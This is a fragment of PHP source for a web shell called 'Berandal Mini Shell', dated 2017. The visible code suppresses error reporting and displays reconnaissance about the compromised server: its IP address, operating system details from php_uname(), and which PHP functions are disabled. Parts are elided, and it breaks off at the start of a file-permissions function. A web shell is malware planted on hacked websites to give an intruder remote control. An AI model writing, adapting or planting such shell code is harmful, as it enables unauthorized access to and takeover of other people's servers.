...
<body>
<h1><center><font color="#E6E6E6">✘✘Berandal Mini Shell✘✘</font></center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
';
echo "<tr><td>";
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING)); 
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=white>NONE</font>";
echo "Server IP : ".gethostbyname($_SERVER['HTTP_HOST'])."</b></font>";
echo "<br>Sysyem: ".php_uname()."</b></font><br>";
echo "Disable Functions: $show_ds</b></font><br><br>";
...
echo '<center><br/>iBerandal1337 - Copyright 2K17</center>
</body>
</html>';
function perms($file){
